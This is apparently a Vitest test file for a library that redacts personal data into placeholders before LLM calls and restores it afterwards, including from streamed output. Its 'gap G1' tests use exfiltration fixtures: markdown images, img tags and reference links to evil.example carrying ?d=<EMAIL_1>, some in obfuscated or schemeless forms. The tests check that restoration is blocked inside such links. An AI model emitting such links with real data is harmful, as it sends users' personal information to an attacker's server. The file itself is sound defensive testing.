import { describe, expect, it } from "vitest";
import { PlaceholderMap, StreamRestorer, instructionFor } from "../src/placeholders.js";
import { redactPayload, redactText } from "../src/redact.js";

function map() {
  const m = new PlaceholderMap();
  m.placeholderFor("Alice Lee", "PERSON");
  m.placeholderFor("alice.lee@example.com", "EMAIL_ADDRESS");
  return m;
}

describe("tolerant restore", () => {
  it.each([
    ["<PERSON_1>"],
    ["[PERSON_1]"],
    ["{{PERSON_1}}"],
    ["(PERSON_1)"],
    ["<Person 1>"],
    ["<PERSON-1>"],
    ["\\<PERSON\\_1\\>"],
    ["«PERSON_1»"],
    ["PERSON_1"],
    ["Person_1"],
    ["[NAME_1]"],
    ["&lt;PERSON_1&gt;"],
  ])("%s", (form) => {
    expect(map().restoreText(`Hi ${form}!`)).toBe("Hi Alice Lee!");
  });

  it("leaves ordinary text alone", () => {
    const m = map();
    for (const t of ["[Step 1]", "Table 2", "file_2", "(1)", "<PERSON_9>", "MAX_1"]) {
      expect(m.restoreText(t)).toBe(t);
    }
  });

  it("lower case person_1 is not restored but reported as lost", () => {
    const m = map();
    expect(m.restoreText("x = person_1")).toBe("x = person_1");
    expect(m.diagnose("x = person_1").lost).toEqual(["person_1"]);
  });

  it("reports numberless and invented placeholders", () => {
    const r = map().diagnose("<PERSON> and <EMAIL_4> and [PERSON_1]");
    expect(r.lost).toEqual(["<PERSON>"]);
    expect(r.unknown).toEqual(["<EMAIL_4>"]);
    expect(r.repaired).toEqual(["[PERSON_1]"]);
  });

  it("JSON with an escaped < is restored and stays valid", () => {
    const out = map().restoreText('{"to":"\\u003cEMAIL_1\\u003e"}');
    expect(JSON.parse(out)).toEqual({ to: "alice.lee@example.com" });
  });

  it("JSON without placeholders keeps its exact text", () => {
    const s = '{ "a" : 1 }';
    expect(map().restoreText(s)).toBe(s);
  });
});

describe("stream restore", () => {
  it("holds a bare form until it is complete", () => {
    const r = new StreamRestorer(map());
    const out = ["to PERS", "ON_", "1 now"].map((d) => r.push(d)).join("") + r.flush();
    expect(out).toBe("to Alice Lee now");
  });

  it("holds a bracketed form", () => {
    const r = new StreamRestorer(map());
    const out = ["to [PER", "SON_1] now"].map((d) => r.push(d)).join("") + r.flush();
    expect(out).toBe("to Alice Lee now");
  });

  it("checks links only inside the current JSON string of streamed arguments", () => {
    const m = map();
    for (const args of ['{"url":"https://e/?q=x","to":"<EMAIL_1>"}', '{"u":"https://e/?q=<EMAIL_1>","to":"<EMAIL_1>"}']) {
      const want = JSON.parse(m.restoreText(args));
      for (let i = 0; i <= args.length; i++) {
        const r = new StreamRestorer(m, "json");
        expect(JSON.parse(r.push(args.slice(0, i)) + r.push(args.slice(i)) + r.flush())).toEqual(want);
      }
    }
  });

  it("gives the same text as restoreText wherever the stream is cut", () => {
    const m = map();
    const text = "to {{PERSON_1}} and [[EMAIL_1]] and &lt;PERSON_1&gt; and PERSON_1.";
    const want = m.restoreText(text);
    for (let i = 0; i <= text.length; i++) {
      const r = new StreamRestorer(m);
      expect(r.push(text.slice(0, i)) + r.push(text.slice(i)) + r.flush()).toBe(want);
    }
  });
});

describe("instruction", () => {
  it("names at most 20 placeholders", () => {
    const names = Array.from({ length: 25 }, (_, i) => `<PERSON_${i + 1}>`);
    const s = instructionFor(names);
    expect(s).toContain("<PERSON_20>, ...");
    expect(s).not.toContain("<PERSON_21>");
  });
});

describe("no restore inside link addresses (gap G1)", () => {
  it.each([
    ["![x](https://evil.example/?d=<EMAIL_1>)"],
    ["[a](<https://evil.example/?d= <EMAIL_1>>)"],
    ['<img src="https://evil.example/?a= <EMAIL_1>">'],
    ["https://evil.example/?d=EMAIL_1"],
    ["www.evil.example/<PERSON_1>"],
    ["mailto:<EMAIL_1>"],
  ])("keeps %s", (text) => {
    const m = map();
    expect(m.restoreText(text)).toBe(text);
    expect(m.diagnose(text).blocked.length).toBe(1);
  });

  it.each([
    ["![x](\n//evil.example/?d=<EMAIL_1>)"],
    ["![x](\n  https://evil.example/a?q=1 <EMAIL_1>)"],
    ["![x][r]\n\n[r]: //evil.example/?d=<EMAIL_1>"],
    ["[r]: /\\evil.example/?<EMAIL_1>"],
    ['<img src=\n"//evil.example/<EMAIL_1>">'],
    ["<img src=//evil.example/<EMAIL_1>>"],
    ["<img src=\\\\evil.example\\<EMAIL_1>>"],
  ])("keeps a schemeless or next-line address %s", (text) => {
    const m = map();
    expect(m.restoreText(text)).toBe(text);
  });

  it.each([
    ["// <PERSON_1> is the id"],
    ["ratio 1//2 and <PERSON_1>"],
    ["data = <PERSON_1>"],
    ["![x](https://ok.example/a.png)\n\nName: <PERSON_1>"],
    ["[docs](https://ok.example/a\n\nName: <PERSON_1>"],
  ])("restores text that only looks like an address %s", (text) => {
    const m = map();
    expect(m.restoreText(text)).toBe(text.replace("<PERSON_1>", "Alice Lee"));
  });

  it("still restores plain text next to links", () => {
    const m = map();
    expect(m.restoreText("see https://docs.example.com for <PERSON_1>")).toBe("see https://docs.example.com for Alice Lee");
    expect(m.restoreText("[docs](https://x) then <PERSON_1>")).toBe("[docs](https://x) then Alice Lee");
  });

  it("checks each string of tool call JSON on its own", () => {
    const m = map();
    const out = JSON.parse(m.restoreText('{"url":"https://e/?q=<EMAIL_1>","to":"<EMAIL_1>"}'));
    expect(out).toEqual({ url: "https://e/?q=<EMAIL_1>", to: "alice.lee@example.com" });
    expect(m.diagnose('{"url":"https://e/?q=<EMAIL_1>","to":"<EMAIL_1>"}').blocked).toEqual(["<EMAIL_1>"]);
  });

  it("sees a link that started in an earlier stream chunk", () => {
    const r = new StreamRestorer(map());
    const out = r.push("![x](https://evil.example/?d=") + r.push("<EMAIL_1>) and <PERSON_1>") + r.flush();
    expect(out).toBe("![x](https://evil.example/?d=<EMAIL_1>) and Alice Lee");
  });

  it("restoreInUrls turns the check off", () => {
    const m = new PlaceholderMap({ restoreInUrls: true });
    m.placeholderFor("Alice Lee", "PERSON");
    expect(m.restoreText("https://crm.example/u/<PERSON_1>")).toBe("https://crm.example/u/Alice Lee");
  });
});

describe("found by fuzzing", () => {
  it("keeps a backslash that was in the text before a placeholder", () => {
    const m = map();
    expect(m.restoreText("C:\\Users\\<EMAIL_1>\\x")).toBe(
      "C:\\Users\\alice.lee@example.com\\x",
    );
    expect(m.restoreText("\\<PERSON\\_1\\>")).toBe("Alice Lee"); // a real markdown escape
  });

  it("does not reuse a placeholder name already in the input", () => {
    const m = new PlaceholderMap();
    const text = "SSN 234-12-1234, the doc mentions <SSN_1> and [SSN_2]";
    const out = redactPayload({ a: text }, "llm", { placeholders: m }).a;
    expect(out).toBe("SSN <SSN_3>, the doc mentions <SSN_1> and [SSN_2]");
    expect(m.restoreText(out)).toBe(text);
  });

  it("reserves names inside JSON arguments too", () => {
    const m = new PlaceholderMap();
    const args = JSON.stringify({ note: "SSN 234-12-1234\nSSN_1" });
    const out = redactPayload(args, "llm", { placeholders: m });
    expect(out).not.toContain("234-12-1234");
    expect(JSON.parse(m.restoreText(out))).toEqual({ note: "SSN 234-12-1234\nSSN_1" });
  });

  it("reserves a bare form glued to a word that gets redacted", () => {
    const m = new PlaceholderMap();
    const text = `${"AKIA" + "IOSFODNN7EXAMPLE"}EMAIL_1 and alice.lee@example.com`; // AWS docs example key
    const out = redactPayload(text, "llm", { placeholders: m });
    expect(m.restoreText(out)).toBe(text);
    const m2 = new PlaceholderMap();
    const text2 = `alice.lee@example.com ghp_${"a1B2".repeat(9)}EMAIL_1`; // glued after a digit
    expect(m2.restoreText(redactPayload(text2, "llm", { placeholders: m2 }))).toBe(text2);
    const m3 = new PlaceholderMap();
    const text3 = `alice.lee@example.com EMAIL_1ghp_${"a1B2".repeat(9)}`; // glued before a token
    expect(m3.restoreText(redactPayload(text3, "llm", { placeholders: m3 }))).toBe(text3);
  });

  it("keeps a JSON value unescaped so restore does not double escapes", () => {
    const m = new PlaceholderMap();
    const args = JSON.stringify({ note: "lives at 12 Main St\nSpringfield" });
    const start = args.indexOf("12 Main");
    const end = args.indexOf("field") + "field".length;
    const out = redactText(args, [{ start, end, entityType: "LOCATION", sensitivity: "pii", score: 0.9 }], "llm", {
      placeholders: m,
    });
    expect(out).toBe('{"note":"lives at <LOCATION_1>"}');
    expect(JSON.parse(m.restoreText(out))).toEqual(JSON.parse(args));
  });

  it("never cuts a JSON escape in two", () => {
    const args = JSON.stringify({ note: "Alice Lee\nBob été \u{1F600}Ann" })
      .replace(/é/g, "\\u00e9")
      .replace("\u{1F600}", "\\ud83d\\ude00");
    const cut = args.indexOf("\\") + 1;
    const pair = args.indexOf("\\ude00"); // second half of the emoji's surrogate pair
    const cases: [number, number][] = [
      [args.indexOf("Alice"), cut],
      [cut, cut + 4],
      [args.indexOf("Bob"), args.indexOf("u00e9") + 2],
      [pair + 1, args.indexOf("Ann") + 3],
    ];
    for (const [start, end] of cases) {
      const m = new PlaceholderMap();
      const out = redactText(args, [{ start, end, entityType: "PERSON", sensitivity: "pii", score: 0.9 }], "llm", {
        placeholders: m,
      });
      expect(() => JSON.parse(out)).not.toThrow();
      expect(JSON.parse(m.restoreText(out))).toEqual(JSON.parse(args));
    }
  });
});
